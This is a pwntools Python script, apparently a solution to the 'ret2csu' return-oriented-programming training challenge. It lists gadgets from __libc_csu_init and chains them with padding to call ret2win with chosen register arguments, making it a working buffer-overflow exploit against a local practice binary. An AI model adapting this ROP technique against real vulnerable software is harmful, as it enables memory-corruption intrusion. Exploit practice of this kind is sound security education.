from pwn import *

context.log_level = "debug"
r = process("./ret2csu")
exe = r.elf

#    Gadgets:
#    in __libc_csu_init:
#    0x0000000000400680 <+64>:	mov    rdx,r15
#    0x0000000000400683 <+67>:	mov    rsi,r14
#    0x0000000000400686 <+70>:	mov    edi,r13d
#    0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
#    0x000000000040068d <+77>:	add    rbx,0x1
#    0x0000000000400691 <+81>:	cmp    rbp,rbx
#    0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
#    0x0000000000400696 <+86>:	add    rsp,0x8
#    0x000000000040069a <+90>:	pop    rbx
#    0x000000000040069b <+91>:	pop    rbp
#    0x000000000040069c <+92>:	pop    r12
#    0x000000000040069e <+94>:	pop    r13
#    0x00000000004006a0 <+96>:	pop    r14
#    0x00000000004006a2 <+98>:	pop    r15
#    0x00000000004006a4 <+100>:	ret

#    0x00000000004006a3: pop rdi; ret;

csu_gadget0 = p64(0x400680)
csu_gadget1 = p64(0x40069A)
pop_rdi = p64(0x4006A3)

payload = cyclic(0x28)
payload += (
    csu_gadget1
    + p64(0)
    + p64(1)
    # rbp must be rbx + 1, this refer to the csu gadget code
    + p64(0x600E48)
    + p64(0)
    + p64(0xCAFEBABECAFEBABE)
    + p64(0xD00DF00DD00DF00D)
)
payload += csu_gadget0 + cyclic(7 * 8)
# We will use csu gadget again, 7 * 8 bytes is for dummy pop
payload += pop_rdi + p64(0xDEADBEEFDEADBEEF)
payload += p64(exe.plt["ret2win"])

r.recvuntil(b"> ")
r.send(payload)
r.interactive()
